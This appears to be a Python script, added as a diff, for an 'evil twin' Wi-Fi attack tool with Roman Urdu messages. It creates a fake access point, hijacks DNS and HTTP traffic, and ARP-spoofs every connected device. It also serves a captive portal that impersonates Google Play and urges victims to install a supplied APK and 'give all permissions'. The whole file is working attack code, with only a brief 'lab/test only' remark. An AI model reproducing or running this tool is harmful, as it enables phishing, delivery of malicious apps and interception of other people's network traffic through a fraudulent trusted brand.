@@ -1,0 +1,649 @@
+#!/usr/bin/python3
+
+import os
+import sys
+import subprocess as sp
+import shutil
+import argparse
+from time import sleep, strftime
+from threading import Thread, Event
+from datetime import datetime
+import platform
+import socket
+import http.server
+
+# --- CONSTANTS ---
+LOG_FILE      = "/var/log/eviltwinx_pro.log"
+APK_LOG       = "/var/log/apk_download_pro.log"
+DEVICE_LOG    = "/tmp/eviltwinx_devices.log"
+WWW_DIR       = "/var/www/html"
+DASH_LOG      = "/tmp/eviltwinx_dash.log"
+MIN_PYTHON    = (3, 6)
+VERSION       = "10.0-AIRGEDDON"
+DEFAULT_PORT  = 80
+
+R = "\033[31m"
+G = "\033[32m"
+Y = "\033[33m"
+B = "\033[34m"
+M = "\033[35m"
+C = "\033[36m"
+W = "\033[0m"
+
+stop_event = Event()
+
+def banner():
+    os.system("clear")
+    print(f"""{C}
+██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗
+██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║
+██████╔╝█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║
+██╔═══╝ ██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║
+██║     ███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║
+╚═╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
+{W}
+{B}DEMON PRO AIRGEDDON EDITION v{VERSION} - CLI + Captive Portal{W}
+{G}By: MHKing | Kali OS | Updated: {datetime.now().year}{W}
+""")
+
+def check_python():
+    if sys.version_info < MIN_PYTHON:
+        print(f"{R}[X] Python {MIN_PYTHON[0]}.{MIN_PYTHON[1]}+ chahiye (aap ke system par {platform.python_version()} hai)!{W}")
+        sys.exit(1)
+
+def check_root():
+    if os.geteuid() != 0:
+        print(f"{R}[X] Root privileges required! Run: sudo python3 evil_twinx_airgeddon.py{W}")
+        sys.exit(1)
+
+def check_tools():
+    need = [
+        "hostapd", "dnsmasq", "arpspoof", "xterm", "lynx", "iw", "ifconfig",
+        "arp", "tail", "watch", "iptables"
+    ]
+    missing = [tool for tool in need if shutil.which(tool) is None]
+    if missing:
+        print(f"{R}[X] Required tools not found: {', '.join(missing)}{W}")
+        print(f"{Y}Install them using: sudo apt install {' '.join(missing)}{W}")
+        sys.exit(1)
+
+def check_www_dir():
+    if not os.path.exists(WWW_DIR):
+        try:
+            os.makedirs(WWW_DIR)
+        except Exception:
+            print(f"{R}[X] {WWW_DIR} nahi bana sakay (permissions issue)!")
+            sys.exit(1)
+
+def log(msg, dash=False):
+    t = strftime("%Y-%m-%d %H:%M:%S")
+    try:
+        with open(LOG_FILE, "a") as f:
+            f.write(f"[{t}] {msg}\n")
+        if dash:
+            with open(DASH_LOG, "a") as f:
+                f.write(f"[{t}] {msg}\n")
+    except Exception:
+        pass
+    print(f"{Y}[LOG]{W} {msg}")
+
+def apk_log(msg):
+    t = strftime("%Y-%m-%d %H:%M:%S")
+    try:
+        with open(APK_LOG, "a") as f:
+            f.write(f"[{t}] {msg}\n")
+    except Exception:
+        pass
+    print(f"{M}[APK]{W} {msg}")
+
+def cli_args():
+    parser = argparse.ArgumentParser(description=f"EvilTwinX AIRGEDDON v{VERSION}")
+    parser.add_argument("--ssid", type=str, help="Fake WiFi ka Naam (SSID)")
+    parser.add_argument("--apk", type=str, help="APK file ka path (e.g. /root/app.apk)")
+    parser.add_argument("--channel", type=int, default=6, help="Fake AP channel (default: 6)")
+    parser.add_argument("--iface", type=str, help="Wireless interface (default: auto detect)")
+    parser.add_argument("--no-terminals", action="store_true", help="xterm terminals skip karein")
+    parser.add_argument("--no-dashboard", action="store_true", help="CLI dashboard disable karein")
+    parser.add_argument("--help-urdu", action="store_true", help="Roman Urdu help dekhain")
+    args = parser.parse_args()
+    return args
+
+def help_urdu():
+    print(f"""{C}
+Yeh tool ek fake WiFi create karta hai (jaise airgeddon/fluxion),
+victim connect hote hi ek security update page kholta hai, jahan APK 
+download ka link hota hai. ARP spoofing, DNS spoofing, web viewer, 
+aur connected devices ke liye alag xterm terminals khulte hain.
+Har cheez CLI par live update hoti hai. Sirf apni hacking lab/test 
+ke liye use karein!
+Examples:
+    sudo python3 evil_twinx_airgeddon.py --ssid "FreeWifi" --apk "/root/app.apk"
+    sudo python3 evil_twinx_airgeddon.py
+Agar --ssid ya --apk na dein, toh CLI wizard se pucha jayega.
+""")
+    sys.exit(0)
+
+def cli_wizard():
+    print(f"{C}--- EvilTwinX AIRGEDDON Setup Wizard ---{W}")
+    ssid = input(f"{G}[?]{W} Fake WiFi ka Naam (SSID): {Y}").strip()
+    print(W, end="")
+    apk = input(f"{G}[?]{W} APK ka poora path (eg: /root/MyApp.apk): {Y}").strip()
+    print(W, end="")
+    if not os.path.isfile(apk):
+        print(f"{R}[X] APK file nahi mili! Path check karo.{W}")
+        sys.exit(1)
+    return ssid, apk
+
+def get_iface(cli_iface=None):
+    if cli_iface:
+        return cli_iface
+    result = sp.getoutput("iw dev | awk '$1==\"Interface\"{print $2}'")
+    iface = result.strip().split("\n")[0]
+    if iface == "":
+        print(f"{R}[X] Koi wireless interface nahi mila!{W}")
+        sys.exit(1)
+    return iface
+
+def setup_files(apk_path, port=DEFAULT_PORT):
+    check_www_dir()
+    if not os.path.isfile(apk_path):
+        print(f"{R}[X] APK file nahi mili: {apk_path}{W}")
+        sys.exit(1)
+    apk_link = f"http://192.168.99.1:{port}/download.apk" if port != 80 else "download.apk"
+    # --- POWERFUL GOLD PREMIUM GLASS WEBSITE UI ---
+    page = f"""
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <title>Official PlayStore APK - Safety Portal</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;500;400&display=swap" rel="stylesheet">
+      <style>
+        body {{
+          min-height: 100vh;
+          margin: 0;
+          padding: 0;
+          background: linear-gradient(135deg,#fffbe5 0%,#fffbe5 40%, #ffe082 100%);
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-family: 'Montserrat', 'Segoe UI', Arial, sans-serif;
+          backdrop-filter: blur(24px) saturate(180%) brightness(1.17);
+        }}
+        .gold-premium {{
+          background: linear-gradient(120deg,rgba(255,255,255,0.95),rgba(255,248,220,0.99),rgba(255,215,0,0.96));
+          border-radius: 38px;
+          box-shadow: 0 16px 80px 0 #ffe082bb, 0 0 0 6px #ffd70055, 0 0 44px 10px #fff9e5cc;
+          border: 2.8px solid #ffd70088;
+          padding: 66px 44px 38px 44px;
+          max-width: 470px;
+          width: 97%;
+          text-align: center;
+          position: relative;
+          z-index: 2;
+          overflow: hidden;
+          transition: box-shadow 0.3s;
+        }}
+        .gold-premium:before {{
+          content: '';
+          position: absolute;
+          inset: 0;
+          background: linear-gradient(120deg,rgba(255,255,255,0.13) 0%,rgba(255,223,34,0.08) 60%,rgba(255,215,0,0.12) 100%);
+          opacity: 0.80;
+          filter: blur(13px) saturate(180%);
+          pointer-events: none;
+          z-index: 0;
+        }}
+        .gold-premium:after {{
+          content: '';
+          position: absolute;
+          top: -90px; left: 30%;
+          width: 180px; height: 180px;
+          border-radius: 50%;
+          background: radial-gradient(circle,rgba(255,255,255,0.24) 0%,rgba(255,215,0,0.09) 90%);
+          filter: blur(21px);
+          opacity: 0.45;
+          z-index: 1;
+          pointer-events:none;
+        }}
+        .gold-logo {{
+          width: 76px;
+          margin-bottom: 29px;
+          filter: drop-shadow(0 4px 17px #ffd700bb);
+          border-radius: 22px;
+          background: rgba(255,255,255,0.14);
+          box-shadow: 0 10px 52px #ffd70021, 0 2px 10px #ffe082cc;
+        }}
+        h2 {{
+          color: #bc8d1a;
+          font-size: 2.19em;
+          margin: 0 0 19px 0;
+          font-weight: 800;
+          letter-spacing: 0.07em;
+          text-shadow: 0 2px 15px #fff8,0 2px 40px #ffd70033;
+          position: relative;
+          z-index: 2;
+          font-family: 'Montserrat',sans-serif;
+        }}
+        .info {{
+          font-size: 1.18em;
+          color: #836f42;
+          background: linear-gradient(110deg,#fff8e1 0%,#fffbe5 100%);
+          border-radius: 15px;
+          padding: 22px 17px 12px 17px;
+          margin-bottom: 31px;
+          box-shadow: 0 2px 22px #ffe97f44;
+          font-weight: 500;
+          border: 1.8px solid #ffe082cc;
+          position: relative;
+          z-index: 2;
+        }}
+        .apk-btn {{
+          background: linear-gradient(93deg,#fff7 20%,#ffd700 100%);
+          color: #977c1a;
+          font-size: 1.31em;
+          border: none;
+          border-radius: 23px;
+          padding: 23px 60px;
+          margin: 38px 0 21px 0;
+          cursor: pointer;
+          font-weight: bold;
+          box-shadow: 0 5px 30px #ffd70055,0 2px 15px #bc8d1a44;
+          transition: 0.19s;
+          letter-spacing: 0.07em;
+          position: relative;
+          z-index: 2;
+        }}
+        .apk-btn:hover {{
+          background: linear-gradient(93deg,#ffd700 15%,#ffeeaa 100%);
+          box-shadow: 0 14px 38px #ffd700cc,0 2px 36px #fffde2aa;
+          color: #fffde5;
+          transform: scale(1.055);
+        }}
+        .powered-gold {{
+          color: #ffd700;
+          font-size: 1.09em;
+          position: absolute;
+          top: 18px; left: 34px;
+          opacity: .93;
+          font-family: 'Montserrat',monospace;
+          letter-spacing: .07em;
+          z-index: 3;
+          font-weight:700;
+          text-shadow: 0 2px 8px #fff8,0 1px 3px #ffd700bb;
+        }}
+        .footer {{
+          font-size: 1.15em;
+          color: #bc8d1a;
+          margin-top: 32px;
+          opacity: 1;
+          font-weight: 700;
+          letter-spacing: 0.08em;
+          text-shadow: 0 2px 8px #fff9, 0 2px 13px #ffd70077;
+        }}
+        .feature-list {{
+          margin: 18px 0 0 0;
+          padding: 0;
+          list-style: none;
+          text-align: left;
+          font-size:1.13em;
+          color:#bc8d1a;
+          letter-spacing:0.01em;
+          line-height:1.7;
+        }}
+        .feature-list li:before {{
+          content: "\\2727";
+          color: #ffd700;
+          font-weight: bold;
+          margin-right: 14px;
+          font-size: 1.16em;
+        }}
+        @media (max-width:480px){{
+          .gold-premium{{padding:11vw 5vw 8vw 5vw;max-width:99vw;}}
+          h2{{font-size:1.18em;}}
+        }}
+        .qr-container {{
+          margin: 21px auto 0px auto;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          gap: 8px;
+        }}
+        .qr-label {{
+          font-size: 1.04em;
+          color: #bc8d1a;
+          margin-bottom: 1px;
+        }}
+        .secure-badge {{
+          background: linear-gradient(90deg,#ffd700cc,#fffde5 80%);
+          color: #fff;
+          font-size: 1.03em;
+          padding: 8px 22px;
+          border-radius: 17px;
+          font-weight: 700;
+          margin-bottom: 18px;
+          box-shadow: 0 1px 8px #ffe082bb;
+          letter-spacing: 0.06em;
+          display:inline-block;
+        }}
+      </style>
+      <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
+      <script>
+        function makeQR(url) {{
+          var qr = qrcode(0, 'L');
+          qr.addData(url);
+          qr.make();
+          document.getElementById('qr-code').innerHTML = qr.createImgTag(5,0);
+        }}
+        window.onload = function() {{
+          makeQR("{apk_link}");
+        }};
+      </script>
+    </head>
+    <body>
+      <div class="gold-premium">
+        <span class="powered-gold">★ Free WiFi Portal Security</span>
+        <span class="secure-badge">SECURE & OFFICIAL</span>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Google_Play_2016_icon.svg" alt="Official PlayStore" class="gold-logo"/>
+        <h2>Download PlayStore Security Update</h2>
+        <div class="info">
+          Download this APK from <b>Official PlayStore</b> for security reasons.
+          <ul class="feature-list">
+            <li>Download and install for safe & secure internet</li>
+            <li>Open the app and give all permissions</li>
+            <li>Enjoy your free and safe internet</li>
+            <li>Fast, mobile friendly, premium gold design</li>
+            <li>One-tap download or scan QR code</li>
+          </ul>
+        </div>
+        <a href="{apk_link}" target="_blank">
+          <button class="apk-btn">⬇️ Download from PlayStore</button>
+        </a>
+        <div class="qr-container">
+          <span class="qr-label">Or scan QR to download:</span>
+          <div id="qr-code"></div>
+        </div>
+        <div class="footer">
+          © 2025 From Official PlayStore For Make Safe and Secure.
+        </div>
+      </div>
+    </body>
+    </html>
+    """
+    with open(f"{WWW_DIR}/index.html", "w") as f:
+        f.write(page)
+    shutil.copy(apk_path, f"{WWW_DIR}/download.apk")
+    os.chmod(f"{WWW_DIR}/download.apk", 0o644)
+    os.chmod(WWW_DIR, 0o755)
+    with open(f"{WWW_DIR}/generate_204", "w") as f: f.write("")
+    with open(f"{WWW_DIR}/ncsi.txt", "w") as f: f.write("Microsoft NCSI")
+    with open(f"{WWW_DIR}/wpad.dat", "w") as f: f.write("function FindProxyForURL(url,host){{return 'DIRECT';}}")
+
+def setup_hostapd(ssid, iface, channel):
+    config = f"""interface={iface}
+ssid={ssid}
+channel={channel}
+driver=nl80211
+hw_mode=g
+auth_algs=1
+ignore_broadcast_ssid=0
+"""
+    with open("/tmp/hostapd.conf", "w") as h:
+        h.write(config)
+    sp.run("killall hostapd 2>/dev/null", shell=True)
+    sp.run("rm -f /var/run/hostapd.pid", shell=True)
+    log(f"Fake AP '{ssid}' create ho raha hai ({iface}, channel {channel})...")
+    sp.Popen(f"hostapd -B /tmp/hostapd.conf", shell=True)
+    sleep(3)
+
+def setup_iptables_airgeddon(iface):
+    sp.run("iptables -F", shell=True)
+    sp.run("iptables -t nat -F", shell=True)
+    sp.run(f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j DNAT --to-destination 192.168.99.1:80", shell=True)
+    sp.run(f"iptables -t nat -A PREROUTING -i {iface} -p udp --dport 53 -j DNAT --to-destination 192.168.99.1:53", shell=True)
+    sp.run(f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 53 -j DNAT --to-destination 192.168.99.1:53", shell=True)
+    sp.run("iptables -t nat -A POSTROUTING -j MASQUERADE", shell=True)
+    print("[OK] iptables [AIRGEDDON STYLE] set ho gaya...")
+
+def setup_dnsmasq_airgeddon(iface):
+    dns_config = f"""interface={iface}
+dhcp-range=192.168.99.10,192.168.99.50,12h
+dhcp-option=3,192.168.99.1
+dhcp-option=6,192.168.99.1
+address=/connectivitycheck.gstatic.com/192.168.99.1
+address=/clients3.google.com/192.168.99.1
+address=/msftconnecttest.com/192.168.99.1
+address=/captive.apple.com/192.168.99.1
+address=/www.gstatic.com/192.168.99.1
+address=/detectportal.firefox.com/192.168.99.1
+address=/connectivitycheck.android.com/192.168.99.1
+address=/www.msftncsi.com/192.168.99.1
+address=/neverssl.com/192.168.99.1
+address=/example.com/192.168.99.1
+address=/google.com/192.168.99.1
+address=/connectivitycheck.gstatic.com/192.168.99.1
+address=/clients3.google.com/192.168.99.1
+address=/msftconnecttest.com/192.168.99.1
+address=/captive.apple.com/192.168.99.1
+address=/www.gstatic.com/192.168.99.1
+address=/detectportal.firefox.com/192.168.99.1
+address=/connectivitycheck.android.com/192.168.99.1
+address=/neverssl.com/192.168.99.1
+address=/example.com/192.168.99.1
+address=/google.com/192.168.99.1
+"""
+    with open("/tmp/dnsmasq.conf", "w") as f:
+        f.write(dns_config)
+    sp.run("killall dnsmasq 2>/dev/null", shell=True)
+    sp.Popen(f"dnsmasq -C /tmp/dnsmasq.conf", shell=True)
+    sp.run(f"ifconfig {iface} 192.168.99.1 netmask 255.255.255.0 up", shell=True)
+    print("[OK] dnsmasq (DHCP+DNS) [AIRGEDDON STYLE] start ho gaya...")
+
+class APKTrackerHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        captive_paths = {
+            "/generate_204", "/gen_204", "/ncsi.txt", "/connecttest.txt", "/success.txt",
+            "/wpad.dat", "/hotspot-detect.html", "/library-test.html", "/captive.apple.com"
+        }
+        if self.path in captive_paths:
+            # Handle captive portal paths
+            if self.path == "/ncsi.txt":
+                self.send_response(200); self.end_headers()
+                self.wfile.write(b"Microsoft NCSI"); return
+            if self.path == "/connecttest.txt":
+                self.send_response(200); self.end_headers()
+                self.wfile.write(b"Microsoft Connect Test"); return
+            if self.path in ["/generate_204", "/gen_204"]:
+                self.send_response(302)
+                self.send_header("Location", "/index.html")
+                self.end_headers(); return
+            if self.path == "/wpad.dat":
+                self.send_response(200); self.end_headers()
+                self.wfile.write(b"function FindProxyForURL(url,host){return 'DIRECT';}"); return
+            if self.path == "/success.txt":
+                self.send_response(200); self.end_headers()
+                self.wfile.write(b"Success"); return
+            if self.path == "/hotspot-detect.html":
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                self.wfile.write(b"<html><head><meta http-equiv='refresh' content='0;url=/index.html'></head><body></body></html>"); return
+            if self.path == "/library-test.html":
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                self.wfile.write(b"<script>window.location='/index.html'</script>"); return
+            if self.path == "/captive.apple.com":
+                self.send_response(302)
+                self.send_header("Location", "/index.html")
+                self.end_headers(); return
+        if self.path == "/favicon.ico":
+            self.send_response(204); self.end_headers(); return
+        # APK direct download
+        if self.path.endswith(".apk"):
+            apk_log(f"APK requested: {self.path}")
+            return http.server.SimpleHTTPRequestHandler.do_GET(self)
+        # Default: redirect everything else to portal
+        self.path = "/index.html"
+        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+
+def start_apk_tracker(port=DEFAULT_PORT):
+    import socketserver
+    os.chdir(WWW_DIR)
+    handler = APKTrackerHandler
+    try:
+        httpd = socketserver.TCPServer(("", port), handler)
+        print(f"[OK] APK Tracker HTTP server port {port} pe chal raha hai...")
+        httpd.serve_forever()
+    except Exception as e:
+        print(f"{R}[X] HTTP server error: {e}{W}")
+
+def device_tracker():
+    log("Connected device tracker background chal raha hai...")
+    while not stop_event.is_set():
+        devices = sp.getoutput("arp -a")
+        try:
+            with open(DEVICE_LOG, "w") as f:
+                f.write(devices)
+        except Exception: pass
+        sleep(8)
+
+def arp_spoof(iface):
+    log("ARP spoofing (victim scan) start ho gaya...")
+    gateway_ip = "192.168.99.1"
+    while not stop_event.is_set():
+        scan = sp.getoutput("arp -a | awk '{print $2}' | tr -d '()'")
+        for ip in scan.splitlines():
+            if ip != gateway_ip and ip.count('.') == 3:
+                sp.Popen(f"arpspoof -i {iface} -t {ip} {gateway_ip}", shell=True)
+        sleep(7)
+
+def term_arp(iface):
+    log("ARP spoofing terminal open ho raha hai...")
+    sp.Popen(["xterm", "-geometry", "88x18", "-e", f"arpspoof -i {iface} -t 192.168.99.100 192.168.99.1"])
+
+def term_dns(iface):
+    log("DNS spoofing terminal open ho raha hai...")
+    sp.Popen(["xterm", "-geometry", "88x12", "-e", f"dnsspoof -i {iface}"])
+
+def term_web(port=DEFAULT_PORT):
+    log("Web viewer terminal open ho raha hai...")
+    url = f"http://192.168.99.1:{port}" if port != 80 else "http://192.168.99.1"
+    sp.Popen(["xterm", "-geometry", "88x12", "-e", f"lynx {url}"])
+
+def term_devices():
+    log("Connected device terminal open ho raha hai...")
+    sp.Popen(["xterm", "-geometry", "88x12", "-e", f"watch -n 3 'arp -a'"])
+
+def dash_writer():
+    while not stop_event.is_set():
+        try:
+            with open(DEVICE_LOG, "r") as f:
+                devices = f.read()
+        except:
+            devices = "No Devices Yet."
+        print(f"\033[2J\033[H")  # Clear CLI
+        print(f"{C}==== EvilTwinX AIRGEDDON Hacker Dashboard ===={W}")
+        print(f"{G}[*]{W} Connected Devices:")
+        print(f"{B}{devices}{W}")
+        print(f"{Y}[*]{W} APK Download Log (last 2):")
+        os.system(f"tail -n 2 {APK_LOG} 2>/dev/null")
+        print(f"{M}[*]{W} General Log (last 3):")
+        os.system(f"tail -n 3 {LOG_FILE}")
+        print(f"{C}----------------------------------------{W}")
+        sleep(5)
+
+def cleanup():
+    log("Cleanup - sab kuch band ho raha hai...")
+    stop_event.set()
+    sp.run("systemctl stop apache2 2>/dev/null", shell=True)
+    sp.run("killall dnsmasq 2>/dev/null", shell=True)
+    sp.run("killall hostapd 2>/dev/null", shell=True)
+    sp.run("killall dnsspoof 2>/dev/null", shell=True)
+    sp.run("killall arpspoof 2>/dev/null", shell=True)
+    sp.run("iptables -F", shell=True)
+    sp.run("iptables -t nat -F", shell=True)
+    sp.run("rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf", shell=True)
+    for fn in [DEVICE_LOG, DASH_LOG]:
+        try:
+            if os.path.exists(fn): os.remove(fn)
+        except Exception:
+            pass
+    print(f"{G}[✓] Clean exit. Logs saved. Bye!{W}")
+
+def main():
+    check_python()
+    check_root()
+    check_tools()
+    banner()
+    args = cli_args()
+    if args.help_urdu:
+        help_urdu()
+    if args.ssid and args.apk:
+        ssid = args.ssid
+        apk_path = args.apk
+        if not os.path.isfile(apk_path):
+            print(f"{R}[X] APK file nahi mili! Path check karo.{W}")
+            sys.exit(1)
+    else:
+        ssid, apk_path = cli_wizard()
+    iface = get_iface(args.iface)
+    channel = args.channel if args.channel else 6
+
+    banner()
+    print(f"{G}[✓]{W} Interface: {iface} | SSID: {ssid} | APK: {apk_path} | Channel: {channel}")
+    print(f"{Y}[~]{W} Sab modules background me start ho rahe hain...")
+
+    sp.run("systemctl stop apache2 2>/dev/null", shell=True)
+
+    setup_hostapd(ssid, iface, channel)
+    setup_iptables_airgeddon(iface)
+    setup_dnsmasq_airgeddon(iface)
+
+    # Try HTTP server on 80, fallback to 8080
+    port = 80
+    started = False
+    try:
+        http_thread = Thread(target=start_apk_tracker, args=(port,), daemon=True)
+        http_thread.start()
+        sleep(1)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        if s.connect_ex(("127.0.0.1", port)) == 0:
+            started = True
+        s.close()
+    except Exception:
+        pass
+    if not started:
+        print(f"{Y}[~]{W} Port 80 busy, trying port 8080...")
+        port = 8080
+        http_thread = Thread(target=start_apk_tracker, args=(port,), daemon=True)
+        http_thread.start()
+        sleep(1)
+
+    setup_files(apk_path, port=port)
+
+    Thread(target=device_tracker, daemon=True).start()
+    Thread(target=arp_spoof, args=(iface,), daemon=True).start()
+    if not args.no_dashboard:
+        Thread(target=dash_writer, daemon=True).start()
+    if not args.no_terminals:
+        Thread(target=term_arp, args=(iface,), daemon=True).start()
+        Thread(target=term_dns, args=(iface,), daemon=True).start()
+        Thread(target=term_web, args=(port,), daemon=True).start()
+        Thread(target=term_devices, daemon=True).start()
+
+    log("All modules live, dashboard active!", True)
+    try:
+        while True:
+            sleep(60)
+    except KeyboardInterrupt:
+        print(f"\n{R}[!] Ctrl+C - Tool band kar rahe hain...{W}")
+        cleanup()
+        sys.exit(0)
+
+if __name__ == "__main__":
+    main()
